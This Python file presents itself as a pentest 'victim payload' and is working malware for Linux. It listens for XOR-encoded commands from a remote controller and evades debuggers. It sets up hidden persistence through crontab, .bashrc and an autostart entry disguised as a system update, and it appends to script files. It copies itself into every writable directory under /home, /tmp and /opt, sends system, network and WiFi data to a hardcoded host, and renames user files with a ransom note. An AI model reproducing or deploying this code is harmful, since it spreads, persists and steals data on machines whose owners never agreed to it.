#!/usr/bin/env python3
"""
VM_Virus.py - Kali Linux victim payload for authorized pentesting
Listens for encrypted commands from Windows C2 host and executes payloads.
"""

import socket
import subprocess
import os
import sys
import time
import random
import threading
import shutil
import glob
from pathlib import Path

# ======================== CONFIGURATION ========================
LISTEN_PORT = 8080                # Must match PORT in HOST_VIRUS_F.cpp
EXFIL_IP = "192.168.18.18"        # <-- CHANGE TO YOUR WINDOWS HOST IP
EXFIL_PORT = 9001                 # Must match EXFIL_PORT in VM_Listener.cpp
XOR_KEY = ord('K')                # Must match XOR key in HOST_VIRUS_F.cpp
# ===============================================================

# Global flag
running = True

# ======================== XOR DECRYPTION ========================
def xor_decrypt(data: bytes, key: int) -> str:
    return ''.join(chr(b ^ key) for b in data).rstrip('\x00')

# ======================== EVASION: ANTI-DEBUG ========================
def is_debugged() -> bool:
    """Simple anti-debug: check for common debug env vars on Linux."""
    debug_vars = ['DEBUG', 'PYTHONDONTWRITEBYTECODE', 'PYCHARM_HOSTED']
    for var in debug_vars:
        if os.environ.get(var):
            return True
    # Check if running under strace
    try:
        with open('/proc/self/status', 'r') as f:
            for line in f:
                if 'TracerPid:' in line and line.split(':')[1].strip() != '0':
                    return True
    except:
        pass
    return False

# ======================== PROPAGATION: PERSISTENCE ========================
def establish_persistence():
    """Add crontab and .bashrc persistence."""
    script_path = os.path.abspath(sys.argv[0])
    
    # 1. CRON persistence (runs every 30 minutes)
    cron_line = f"*/30 * * * * python3 {script_path} &\n"
    try:
        # Add to user's crontab
        existing = subprocess.run(['crontab', '-l'], capture_output=True, text=True).stdout
        if script_path not in existing:
            new_cron = existing + cron_line
            proc = subprocess.run(['crontab', '-'], input=new_cron, text=True, capture_output=True)
            if proc.returncode == 0:
                print("[+] Persistence via crontab established")
    except:
        pass
    
    # 2. .bashrc persistence
    bashrc_path = os.path.expanduser("~/.bashrc")
    bash_line = f"\npython3 {script_path} &\n"
    try:
        with open(bashrc_path, 'r') as f:
            content = f.read()
        if script_path not in content:
            with open(bashrc_path, 'a') as f:
                f.write(bash_line)
            print("[+] Persistence via .bashrc established")
    except:
        pass
    
    # 3. .config/autostart for desktop environments
    autostart_dir = os.path.expanduser("~/.config/autostart")
    os.makedirs(autostart_dir, exist_ok=True)
    desktop_entry = f"""[Desktop Entry]
Type=Application
Name=SystemUpdateSvc
Exec=python3 {script_path}
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
"""
    try:
        with open(os.path.join(autostart_dir, 'system-update.desktop'), 'w') as f:
            f.write(desktop_entry)
        print("[+] Persistence via autostart established")
    except:
        pass

# ======================== PROPAGATION: FILE INFECTOR ========================
def infect_local_files():
    """Append infection marker to .sh and .py files in home directory."""
    home = os.path.expanduser("~")
    marker = b"[INFECTED_BY_KALI_PENTEST]"
    script_path = os.path.abspath(sys.argv[0]).encode()
    count = 0
    
    extensions = ['.sh', '.py', '.bash']
    for ext in extensions:
        for root, dirs, files in os.walk(home):
            for f in files:
                if f.endswith(ext):
                    fpath = os.path.join(root, f)
                    try:
                        if os.path.getsize(fpath) < 500000:  # <500KB
                            with open(fpath, 'ab') as fh:
                                fh.write(marker + script_path)
                            count += 1
                    except:
                        continue
    print(f"[+] Infected {count} files with marker")

# ======================== PROPAGATION: DIRECTORY REPLICATION ========================
def replicate_to_all_dirs():
    """Copy this script into every directory and subdirectory under /home, /tmp, and /opt."""
    script_path = os.path.abspath(sys.argv[0])
    script_name = os.path.basename(script_path)
    copied_count = 0
    
    # Read our own source code once
    try:
        with open(script_path, 'r') as f:
            source_code = f.read()
    except:
        print("[-] Could not read self for replication")
        return
    
    # Target root directories for maximum spread
    target_roots = ['/home', '/tmp', '/opt', '/var/tmp']
    
    for root_dir in target_roots:
        if not os.path.exists(root_dir):
            continue
        try:
            for current_dir, dirs, files in os.walk(root_dir):
                # Skip directories we can't write to
                if not os.access(current_dir, os.W_OK):
                    continue
                
                dest_path = os.path.join(current_dir, script_name)
                
                # Skip if already present (avoid redundant writes)
                if os.path.exists(dest_path):
                    continue
                
                try:
                    with open(dest_path, 'w') as f:
                        f.write(source_code)
                    os.chmod(dest_path, 0o755)  # Make executable
                    copied_count += 1
                except:
                    continue
        except:
            continue
    
    print(f"[+] Replicated into {copied_count} directories across the filesystem")

# ======================== PAYLOAD: DATA EXFILTRATION ========================
def exfiltrate_data():
    """Collect system info and exfiltrate to Windows host."""
    data = []
    data.append("=== EXFILTRATED DATA ===")
    
    # Basic system info
    data.append(f"User: {os.environ.get('USER', 'unknown')}")
    data.append(f"Hostname: {socket.gethostname()}")
    data.append(f"OS: Kali Linux")
    
    # OS release info
    try:
        with open('/etc/os-release', 'r') as f:
            data.append(f.read().strip())
    except:
        pass
    
    # Network info
    try:
        result = subprocess.run(['ip', 'addr'], capture_output=True, text=True)
        data.append("=== NETWORK ===")
        data.append(result.stdout)
    except:
        pass
    
    # Running processes
    try:
        result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
        data.append("=== PROCESSES ===")
        data.append(result.stdout[:500])  # Truncate
    except:
        pass
    
    # WiFi profiles (Kali/WiFi)
    try:
        result = subprocess.run(['nmcli', '-t', '-f', 'NAME', 'connection', 'show'],
                               capture_output=True, text=True)
        data.append("=== SAVED NETWORKS ===")
        data.append(result.stdout)
    except:
        pass
    
    exfil_str = "\n".join(data)
    
    # Send to Windows exfil listener
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((EXFIL_IP, EXFIL_PORT))
        s.send(exfil_str.encode())
        s.close()
        print(f"[+] Exfiltrated {len(exfil_str)} bytes to {EXFIL_IP}:{EXFIL_PORT}")
    except Exception as e:
        print(f"[-] Exfil failed: {e}")

# ======================== PAYLOAD: RANSOMWARE SIMULATION ========================
def encrypt_simulation():
    """Rename files with a .locked extension (reversible simulation)."""
    home = os.path.expanduser("~")
    targets = ['.doc', '.docx', '.xls', '.xlsx', '.pdf', '.jpg', '.png', '.txt', '.py', '.cpp', '.sh']
    
    target_dirs = [
        os.path.join(home, 'Documents'),
        os.path.join(home, 'Desktop'),
        os.path.join(home, 'Pictures'),
        os.path.join(home, 'Downloads'),
    ]
    
    count = 0
    for d in target_dirs:
        if not os.path.exists(d):
            continue
        for root, dirs, files in os.walk(d):
            for f in files:
                ext = os.path.splitext(f)[1].lower()
                if ext in targets:
                    old_path = os.path.join(root, f)
                    new_path = old_path + '.locked'
                    try:
                        os.rename(old_path, new_path)
                        count += 1
                    except:
                        continue
    
    # Write ransom note
    note_path = os.path.expanduser("~/Desktop/README_LOCKED.txt")
    try:
        with open(note_path, 'w') as f:
            f.write(f"=== RANSOMWARE SIMULATION ===\n")
            f.write(f"Files encrypted: {count}\n")
            f.write(f"Contact: attacker@onionmail.org to recover.\n")
            f.write(f"This is a penetration test simulation.\n")
            f.write(f"Run: find ~ -name '*.locked' -exec sh -c 'mv \"$1\" \"${{1%.locked}}\"' _ {{}} \\;\n")
            f.write(f"To reverse the encryption.\n")
        # Open with xdg-open or gedit
        subprocess.run(['xdg-open', note_path], capture_output=True)
    except:
        pass
    
    print(f"[+] Renamed {count} files to .locked")

# ======================== PAYLOAD: OPEN 5 WEBSITES ========================
def open_random_websites():
    """Open 5 random websites using xdg-open."""
    sites = [
        "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
        "https://www.google.com/search?q=you+are+hacked",
        "https://www.reddit.com/r/Unexpected/",
        "https://www.twitch.tv/",
        "https://en.wikipedia.org/wiki/Special:Random",
        "https://hackerone.com/hacktivity",
        "https://news.ycombinator.com/",
        "https://pointerpointer.com/"
    ]

    selected = random.sample(sites, 5)
    for site in selected:
        try:
            subprocess.Popen(['xdg-open', site], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(0.5)
        except:
            pass
    print("[+] Opened 5 random websites")

# ======================== PAYLOAD: MOUSE JITTER ========================
def random_mouse_movement():
    """Move mouse randomly using xdotool (must be installed)."""
    try:
        # Check if xdotool available
        subprocess.run(['which', 'xdotool'], check=True, capture_output=True)
        for _ in range(50):
            x = random.randint(0, 1920)
            y = random.randint(0, 1080)
            subprocess.run(['xdotool', 'mousemove', str(x), str(y)], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(0.2)
        print("[+] Mouse jitter completed")
    except:
        print("[-] xdotool not installed. Run: sudo apt install xdotool")

# ======================== PAYLOAD: RANDOM APP LAUNCHER ========================
def random_app_launcher():
    """Launch 4 random apps."""
    apps = ['xterm', 'gedit', 'gnome-calculator', 'firefox', 'nautilus']
    selected = random.sample(apps, 4)
    for app in selected:
        try:
            subprocess.Popen([app], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(0.3)
        except:
            pass
    print("[+] Opened 4 random applications")

# ======================== PAYLOAD: SCREEN FLASHING ========================
def screen_flashing():
    """Flash colored windows using xdotool/xterm hack."""
    try:
        for i in range(30):
            r = random.randint(0, 255)
            g = random.randint(0, 255)
            b = random.randint(0, 255)
            hex_color = f"#{r:02x}{g:02x}{b:02x}"
            # Open a small colored xterm window
            subprocess.Popen(['xterm', '-bg', hex_color, '-fg', 'white', 
                             '-geometry', '80x24+0+0', '-e', 'sleep 0.2'],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(0.15)
        print("[+] Screen flashing completed")
    except:
        print("[-] xterm not available for screen flash")

# ======================== PAYLOAD: KEYBOARD SPAM ========================
def keyboard_spam():
    """Type ransom message using xdotool."""
    message = "YOUR SYSTEM HAS BEEN COMPROMISED! Pay 1 BTC to recover your files. "
    try:
        subprocess.run(['which', 'xdotool'], check=True, capture_output=True)
        for char in message:
            if char == ' ':
                subprocess.run(['xdotool', 'key', 'space'], 
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            elif char == '!':
                subprocess.run(['xdotool', 'key', 'exclam'], 
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            elif char == '.':
                subprocess.run(['xdotool', 'key', 'period'], 
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                subprocess.run(['xdotool', 'type', char], 
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(0.05)
        subprocess.run(['xdotool', 'key', 'Return'], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("[+] Keyboard spam completed")
    except:
        print("[-] xdotool not installed for keyboard spam")

# ======================== COMMAND EXECUTOR ========================
def execute_command(command: str):
    """Route decrypted command to appropriate payload."""
    global running
    cmd = command.strip().lower()
    
    if cmd == "exit":
        running = False
    elif cmd == "websites":
        open_random_websites()
    elif cmd == "mouse":
        random_mouse_movement()
    elif cmd == "app":
        random_app_launcher()
    elif cmd == "flash":
        screen_flashing()
    elif cmd == "keyboard":
        keyboard_spam()
    elif cmd == "exfil":
        exfiltrate_data()
    elif cmd == "encrypt":
        encrypt_simulation()
    elif cmd == "persist":
        establish_persistence()
    elif cmd == "infect":
        infect_local_files()
    elif cmd == "replicate":
        replicate_to_all_dirs()
    elif cmd == "all":
        open_random_websites()
        time.sleep(1)
        random_mouse_movement()
        time.sleep(0.5)
        random_app_launcher()
        time.sleep(0.5)
        screen_flashing()
        time.sleep(0.5)
        keyboard_spam()
        time.sleep(1)
        exfiltrate_data()
        encrypt_simulation()
        establish_persistence()
        infect_local_files()
        time.sleep(1)
        replicate_to_all_dirs()
    else:
        print(f"[!] Unknown command: {command}")

# ======================== MAIN ========================
def main():
    global running
    
    # Anti-debug check
    if is_debugged():
        sys.exit(0)
    
    # Daemonize if no DISPLAY (headless mode)
    if not os.environ.get('DISPLAY'):
        print("[*] Headless mode - payloads limited to non-GUI operations")
    
    # Create listener socket
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server_sock.bind(('0.0.0.0', LISTEN_PORT))
        server_sock.listen(3)
        server_sock.settimeout(1.0)  # Allow checking running flag
    except Exception as e:
        print(f"[-] Failed to bind on port {LISTEN_PORT}: {e}")
        sys.exit(1)
    
    print(f"[*] Kali VM Payload listening on 0.0.0.0:{LISTEN_PORT}")
    print(f"[*] Waiting for commands from Windows C2...")
    
    while running:
        try:
            client_sock, addr = server_sock.accept()
            print(f"[+] Connection from {addr[0]}:{addr[1]}")
            
            data = client_sock.recv(4096)
            if data:
                command = xor_decrypt(data, XOR_KEY)
                print(f"[+] Received command: {command}")
                execute_command(command)
            
            client_sock.close()
        except socket.timeout:
            continue
        except Exception as e:
            print(f"[-] Error: {e}")
    
    server_sock.close()
    print("[*] Payload shutting down")

if __name__ == "__main__":
    main()
        